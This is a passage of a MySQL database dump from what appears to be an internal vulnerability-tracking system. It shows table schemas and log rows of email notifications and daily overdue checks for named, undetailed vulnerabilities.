-- Table structure for table `category`
--

DROP TABLE IF EXISTS `category`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `category`
--

LOCK TABLES `category` WRITE;
/*!40000 ALTER TABLE `category` DISABLE KEYS */;
INSERT INTO `category` VALUES (1,'5de76127152e93ac81d7edce','技术分享',1575444775.06172),(2,'5de76127152e93ac81d7edd1','内部系统说明文档',1575444775.07003),(3,'5de76127152e93ac81d7edd2','部门安全规范制度',1575444775.07267),(4,'5de76127152e93ac81d7edd3','漏洞知识库',1575444775.07571),(5,'5de76127152e93ac81d7edd4','公司安全规范制度',1575444775.07829),(6,'5de76127152e93ac81d7edd5','漏洞解决方案',1575444775.0808);
/*!40000 ALTER TABLE `category` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `crontab`
--

DROP TABLE IF EXISTS `crontab`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `crontab` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `name` text NOT NULL,
  `uid` int(11) NOT NULL,
  `eid` varchar(255) NOT NULL,
  `crontab` varchar(255) NOT NULL,
  `relate` varchar(255) NOT NULL,
  `relate_id` varchar(255) NOT NULL,
  `enable` int(11) NOT NULL,
  `remark` text NOT NULL,
  `exec_count` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `log` longtext,
  `config` text NOT NULL,
  `create_time` double NOT NULL,
  `update_time` double NOT NULL,
  `last_time` double NOT NULL,
  `next_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `crontab`
--

LOCK TABLES `crontab` WRITE;
/*!40000 ALTER TABLE `crontab` DISABLE KEYS */;
/*!40000 ALTER TABLE `crontab` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `crontablog`
--

DROP TABLE IF EXISTS `crontablog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `crontablog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `crontab_id` varchar(255) NOT NULL,
  `content` longtext,
  `start_time` double NOT NULL,
  `end_time` double NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `crontablog`
--

LOCK TABLES `crontablog` WRITE;
/*!40000 ALTER TABLE `crontablog` DISABLE KEYS */;
/*!40000 ALTER TABLE `crontablog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `extension`
--

DROP TABLE IF EXISTS `extension`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `extension` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `eid` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `path` varchar(255) NOT NULL,
  `type` int(11) NOT NULL,
  `version` varchar(255) NOT NULL,
  `remark` varchar(255) NOT NULL,
  `desc` varchar(255) NOT NULL,
  `status` int(11) NOT NULL,
  `config_template` text NOT NULL,
  `config` text NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `extension`
--

LOCK TABLES `extension` WRITE;
/*!40000 ALTER TABLE `extension` DISABLE KEYS */;
/*!40000 ALTER TABLE `extension` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `extensionlog`
--

DROP TABLE IF EXISTS `extensionlog`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `extensionlog` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
  `eid` varchar(255) NOT NULL,
  `app_id` int(11) NOT NULL,
  `is_auto` int(11) NOT NULL,
  `op_user_id` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `path` varchar(255) NOT NULL,
  `title` varchar(255) NOT NULL,
  `content` text NOT NULL,
  `status` int(11) NOT NULL,
  `create_time` double NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=105 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `extensionlog`
--

LOCK TABLES `extensionlog` WRITE;
/*!40000 ALTER TABLE `extensionlog` DISABLE KEYS */;
INSERT INTO `extensionlog` VALUES (1,'61f103ee7ff55b03ea033372','',0,2,'1','漏洞已确认','','邮件发送','漏洞已确认 发送到test02@example.com,test02@example.com',0,1643185134.6304681),(2,'61f2544f029176f6f977d73f','',0,2,'1','漏洞已知悉','','邮件发送','漏洞已知悉 发送到test02@example.com,test02@example.com',0,1643271247.4797013),(3,'61f25acc029176f6f977d75c','',0,2,'3','漏洞申请复测','','邮件发送','漏洞申请复测 发送到test02@example.com,test02@example.com',0,1643272908.6763265),(4,'61f26d647f4f9f6d5fc5cd81','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">58</p> 天 发送到test02@example.com',0,1643277668.0621457),(5,'61f26d6a7f4f9f6d5fc5cd82','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">575</p>  天 发送到test02@example.com',0,1643277674.1969476),(6,'61f3bee43656ba699cf7dba5','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">57</p> 天 发送到test02@example.com',0,1643364068.6121516),(7,'61f3beea3656ba699cf7dba6','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">576</p>  天 发送到test02@example.com',0,1643364074.7754745),(8,'61f51064fdd10fff83bef1a2','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">56</p> 天 发送到test02@example.com',0,1643450468.6444178),(9,'61f5106afdd10fff83bef1a3','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">577</p>  天 发送到test02@example.com',0,1643450474.7858176),(10,'61f661e48ce48e9dc85adc83','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">55</p> 天 发送到test02@example.com',0,1643536868.9054937),(11,'61f661eb8ce48e9dc85adc84','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">578</p>  天 发送到test02@example.com',0,1643536875.0582814),(12,'61f7b3643b2546a7a6a3a4d5','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">54</p> 天 发送到test02@example.com',0,1643623268.1832078),(13,'61f7b36a3b2546a7a6a3a4d6','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">579</p>  天 发送到test02@example.com',0,1643623274.3373313),(14,'61f904e49876933ab631b32f','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">53</p> 天 发送到test02@example.com',0,1643709668.4821508),(15,'61f904ea9876933ab631b330','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">580</p>  天 发送到test02@example.com',0,1643709674.6530018),(16,'61fa5664313fdb30ed137a00','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">52</p> 天 发送到test02@example.com',0,1643796068.6473083),(17,'61fa566a313fdb30ed137a01','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">581</p>  天 发送到test02@example.com',0,1643796074.7866886),(18,'61fba7e4b9d763ab0f15efbf','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">51</p> 天 发送到test02@example.com',0,1643882468.634148),(19,'61fba7eab9d763ab0f15efc0','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">582</p>  天 发送到test02@example.com',0,1643882474.7776577),(20,'61fcf9641a247768031ed696','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">50</p> 天 发送到test02@example.com',0,1643968868.6215515),(21,'61fcf96a1a247768031ed697','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">583</p>  天 发送到test02@example.com',0,1643968874.765796),(22,'61fe4ae4537ca26263033fbe','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">49</p> 天 发送到test02@example.com',0,1644055268.6854124),(23,'61fe4aea537ca26263033fbf','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">584</p>  天 发送到test02@example.com',0,1644055274.8528066),(24,'61ff9c64773e47fc055b3416','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">48</p> 天 发送到test02@example.com',0,1644141668.062348),(25,'61ff9c6a773e47fc055b3417','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">585</p>  天 发送到test02@example.com',0,1644141674.2187297),(26,'6200ede44d0d3f55ad27fe50','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">47</p> 天 发送到test02@example.com',0,1644228068.221146),(27,'6200edea4d0d3f55ad27fe51','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">586</p>  天 发送到test02@example.com',0,1644228074.4075913),(28,'62023f64bbcf1dc37fef64ce','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">46</p> 天 发送到test02@example.com',0,1644314468.4589524),(29,'62023f6abbcf1dc37fef64cf','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">587</p>  天 发送到test02@example.com',0,1644314474.6084185),(30,'620390e4ea807dc85dca0851','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">45</p> 天 发送到test02@example.com',0,1644400868.6461842),(31,'620390eaea807dc85dca0852','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">588</p>  天 发送到test02@example.com',0,1644400874.8053122),(32,'6204e2643e8cdcf3fbbd4234','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">44</p> 天 发送到test02@example.com',0,1644487268.6252236),(33,'6204e26a3e8cdcf3fbbd4235','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">589</p>  天 发送到test02@example.com',0,1644487274.7727435),(34,'620633e4dcbf2766a0f069a9','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">43</p> 天 发送到test02@example.com',0,1644573668.921148),(35,'620633ebdcbf2766a0f069aa','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">590</p>  天 发送到test02@example.com',0,1644573675.077246),(36,'62078564847d758f885a18ce','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">42</p> 天 发送到test02@example.com',0,1644660068.1083038),(37,'6207856a847d758f885a18cf','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">591</p>  天 发送到test02@example.com',0,1644660074.2684238),(38,'6208d6e42ae0c838293a6e31','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">41</p> 天 发送到test02@example.com',0,1644746468.5561671),(39,'6208d6ea2ae0c838293a6e32','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">592</p>  天 发送到test02@example.com',0,1644746474.7948844),(40,'620a2864d10a33b01f6f485c','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">40</p> 天 发送到test02@example.com',0,1644832868.767129),(41,'620a286ad10a33b01f6f485d','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">593</p>  天 发送到test02@example.com',0,1644832874.914392),(42,'620b4986029176f6f977d763','',0,2,'1','漏洞已知悉','','邮件发送','漏洞已知悉 发送到test02@example.com',0,1644906886.431696),(43,'620b6b5fb1df1709463a9fe5','',0,2,'5','漏洞已确认','','邮件发送','漏洞已确认 发送到test01@example.com,sec01@sec.com',0,1644915551.5804455),(44,'620b79e4e5725537431bab2f','',0,2,'','漏洞逾期检查','','漏洞逾期检查','全局任意文件上传 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">14</p>  天 发送到sec01@sec.com,test02@example.com',0,1644919268.3511455),(45,'620b79eae5725537431bab30','',0,2,'','漏洞逾期检查','','漏洞逾期检查','shiro反序列化漏洞 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">600</p>  天 发送到sec01@sec.com',0,1644919274.4707673),(46,'620b79f0e5725537431bab31','',0,2,'','漏洞逾期检查','','漏洞逾期检查','安全测试03 已逾期 <p style=\"font-size:20px;color:green;display:inline-block;\">0</p>  天 发送到sec01@sec.com,test01@example.com',0,1644919280.9838078),(47,'620c97eeb1df1709463a9fed','',0,2,'5','漏洞已知悉','','邮件发送','漏洞已知悉 发送到test01@example.com,sec01@sec.com',0,1644992494.4191134),(48,'620c9833b1df1709463a9ff3','',0,2,'2','漏洞申请复测','','邮件发送','漏洞申请复测 发送到test01@example.com,sec01@sec.com',0,1644992563.520094),(49,'620c9873b1df1709463a9ff9','',0,2,'5','漏洞已修复','','邮件发送','漏洞已修复 发送到test01@example.com,sec01@sec.com',0,1644992627.5201297),(50,'620c99b7b1df1709463aa001','',0,2,'5','漏洞已确认','','邮件发送','漏洞已确认 发送到test01@example.com,sec01@sec.com',0,1644992951.1001153),(51,'620c99d5b1df1709463aa008','',0,2,'5','漏洞已驳回','','邮件发送','漏洞已驳回 发送到test01@example.com,sec01@sec.com',0,1644992981.4391072),(52,'620c9b12b1df1709463aa00e','',0,2,'5','漏洞已确认','','邮件发送','漏洞已确认 发送到test01@example.com,sec01@sec.com',0,1644993298.8131342),(53,'620cab0ab1df1709463aa042','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644997386.4072971),(54,'620cabe3b1df1709463aa048','',0,2,'7','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644997603.2431176),(55,'620cac44b1df1709463aa04e','',0,2,'7','漏洞申请复测','','邮件发送','漏洞申请复测 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644997700.3663096),(56,'620cae4db1df1709463aa055','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644998221.849225),(57,'620cae64b1df1709463aa05b','',0,2,'7','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644998244.5951586),(58,'620caf86b1df1709463aa061','',0,2,'10','漏洞申请复测','','邮件发送','漏洞申请复测 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644998534.6441717),(59,'620cb11db1df1709463aa06d','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644998941.138326),(60,'620cb189b1df1709463aa073','',0,2,'7','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644999049.5052843),(61,'620cb1aeb1df1709463aa079','',0,2,'7','漏洞申请复测','','邮件发送','漏洞申请复测 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644999086.5621083),(62,'620cb229b1df1709463aa080','',0,2,'8','漏洞已修复','','邮件发送','漏洞已修复 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1644999209.3141153),(63,'620cb6a2b1df1709463aa08b','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645000354.7396424),(64,'620ccb64d086b4847eda842b','',0,2,'','漏洞逾期检查','','漏洞逾期检查','sql注入1 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到develop1@develop1.com,anheng@anheng.com,sec01@sec01.com',0,1645005668.272043),(65,'620ccb6ad086b4847eda842c','',0,2,'','漏洞逾期检查','','漏洞逾期检查','xss1 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到develop1@develop1.com,anheng@anheng.com,sec01@sec01.com',0,1645005674.3911011),(66,'620ccb70d086b4847eda842d','',0,2,'','漏洞逾期检查','','漏洞逾期检查','xss2 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到develop1@develop1.com,anheng@anheng.com,sec01@sec01.com',0,1645005680.4997456),(67,'620df3d7b1df1709463aa091','',0,2,'8','漏洞已修复','','邮件发送','漏洞已修复 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645081559.1554945),(68,'620df54fb1df1709463aa097','',0,2,'8','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645081935.87768),(69,'620df55bb1df1709463aa09d','',0,2,'8','漏洞申请复测','','邮件发送','漏洞申请复测 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645081947.0411913),(70,'620df560b1df1709463aa0a3','',0,2,'8','漏洞已修复','','邮件发送','漏洞已修复 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645081952.1291013),(71,'620df647b1df1709463aa0aa','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082183.3841794),(72,'620df6bab1df1709463aa0b0','',0,2,'7','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082298.0141149),(73,'620df6ccb1df1709463aa0b6','',0,2,'7','漏洞申请复测','','邮件发送','漏洞申请复测 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082316.4761887),(74,'620df703b1df1709463aa0bc','',0,2,'8','漏洞已修复','','邮件发送','漏洞已修复 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082371.161702),(75,'620df706b1df1709463aa0c2','',0,2,'8','漏洞已修复','','邮件发送','漏洞已修复 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082374.7712955),(76,'620df76bb1df1709463aa0c9','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082475.6131217),(77,'620df77eb1df1709463aa0cf','',0,2,'8','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082494.9611044),(78,'620df78ab1df1709463aa0d5','',0,2,'8','漏洞申请复测','','邮件发送','漏洞申请复测 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082506.1821032),(79,'620df7a3b1df1709463aa0db','',0,2,'8','漏洞已修复','','邮件发送','漏洞已修复 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645082531.667107),(80,'620dfb18b1df1709463aa0e8','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到guoshun@guoshun.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645083416.2752192),(81,'620dfb1fb1df1709463aa0ee','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645083423.8871815),(82,'620dfb2ab1df1709463aa0f4','',0,2,'8','漏洞已驳回','','邮件发送','漏洞已驳回 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,sec01@sec01.com',0,1645083434.3211622),(83,'620e013db1df1709463aa102','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,develop11@a.com,sec01@sec01.com',0,1645084989.3356245),(84,'620e0147b1df1709463aa10a','',0,2,'8','漏洞已知悉','','邮件发送','漏洞已知悉 发送到anheng@anheng.com,develop1@develop1.com,develop1@develop1.com,develop11@a.com,sec01@sec01.com',0,1645084999.0450916),(85,'620e0c5ab1df1709463aa116','',0,2,'8','漏洞已确认','','邮件发送','漏洞已确认 发送到develop2@develop2.com,develop2@develop2.com,sec01@sec01.com',0,1645087834.4200451),(86,'620e0db0b1df1709463aa11d','',0,2,'9','漏洞已知悉','','邮件发送','漏洞已知悉 发送到guoshun@guoshun.com,develop1@develop1.com,develop1@develop1.com,develop11@a.com,sec01@sec01.com',0,1645088176.2471416),(87,'620e0f24b1df1709463aa12b','',0,2,'1','漏洞已知悉','','邮件发送','漏洞已知悉 发送到develop2@develop2.com,develop2@develop2.com,sec01@sec01.com',0,1645088548.232109),(88,'620e0f2bb1df1709463aa131','',0,2,'1','漏洞申请复测','','邮件发送','漏洞申请复测 发送到develop2@develop2.com,develop2@develop2.com,sec01@sec01.com',0,1645088555.4272356),(89,'620e1ce5727d68e9fe62b44e','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_ah 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到anheng@anheng.com,develop11@a.com,develop1@develop1.com,sec01@sec01.com',0,1645092069.3142595),(90,'620e1ceb727d68e9fe62b44f','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_gs 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到develop11@a.com,develop1@develop1.com,guoshun@guoshun.com,sec01@sec01.com',0,1645092075.4329457),(91,'620e1cf1727d68e9fe62b450','',0,2,'','漏洞逾期检查','','漏洞逾期检查','sql_kaifa2 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到anheng@anheng.com,develop11@a.com,develop1@develop1.com,sec01@sec01.com',0,1645092081.5549183),(92,'620e1cf7727d68e9fe62b451','',0,2,'','漏洞逾期检查','','漏洞逾期检查','aaa 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">59</p> 天 发送到develop2@develop2.com,sec01@sec01.com',0,1645092087.6737597),(93,'620f6e64136eecad3c794ead','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_ah 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">58</p> 天 发送到develop11@a.com,sec01@sec01.com,develop1@develop1.com,anheng@anheng.com',0,1645178468.7011917),(94,'620f6e6a136eecad3c794eae','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_gs 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">58</p> 天 发送到develop11@a.com,sec01@sec01.com,develop1@develop1.com,guoshun@guoshun.com',0,1645178474.8657336),(95,'620f6e70136eecad3c794eaf','',0,2,'','漏洞逾期检查','','漏洞逾期检查','sql_kaifa2 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">58</p> 天 发送到develop11@a.com,sec01@sec01.com,develop1@develop1.com,anheng@anheng.com',0,1645178480.9852784),(96,'620f6e77136eecad3c794eb0','',0,2,'','漏洞逾期检查','','漏洞逾期检查','aaa 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">58</p> 天 发送到sec01@sec01.com,develop2@develop2.com',0,1645178487.0941997),(97,'6210bfe4c276a4e847688def','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_ah 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">57</p> 天 发送到sec01@sec01.com,develop11@a.com,develop1@develop1.com,anheng@anheng.com',0,1645264868.836148),(98,'6210bfebc276a4e847688df0','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_gs 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">57</p> 天 发送到sec01@sec01.com,develop11@a.com,develop1@develop1.com,guoshun@guoshun.com',0,1645264875.0011575),(99,'6210bff1c276a4e847688df1','',0,2,'','漏洞逾期检查','','漏洞逾期检查','sql_kaifa2 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">57</p> 天 发送到sec01@sec01.com,develop11@a.com,develop1@develop1.com,anheng@anheng.com',0,1645264881.1296291),(100,'6210bff7c276a4e847688df2','',0,2,'','漏洞逾期检查','','漏洞逾期检查','aaa 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">57</p> 天 发送到sec01@sec01.com,develop2@develop2.com',0,1645264887.2438035),(101,'6212116412d781b54635d577','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_ah 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">56</p> 天 发送到develop11@a.com,anheng@anheng.com,sec01@sec01.com,develop1@develop1.com',0,1645351268.2821524),(102,'6212116a12d781b54635d578','',0,2,'','漏洞逾期检查','','漏洞逾期检查','rce_gs 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">56</p> 天 发送到develop11@a.com,sec01@sec01.com,guoshun@guoshun.com,develop1@develop1.com',0,1645351274.4512184),(103,'6212117012d781b54635d579','',0,2,'','漏洞逾期检查','','漏洞逾期检查','sql_kaifa2 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">56</p> 天 发送到develop11@a.com,anheng@anheng.com,sec01@sec01.com,develop1@develop1.com',0,1645351280.570626),(104,'6212117612d781b54635d57a','',0,2,'','漏洞逾期检查','','漏洞逾期检查','aaa 未逾期, 剩余处理时间 <p style=\"font-size:20px;color:green;display:inline-block;\">56</p> 天 发送到develop2@develop2.com,sec01@sec01.com',0,1645351286.690132);
/*!40000 ALTER TABLE `extensionlog` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `group`
--

DROP TABLE IF EXISTS `group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `_id` varchar(255) NOT NULL,
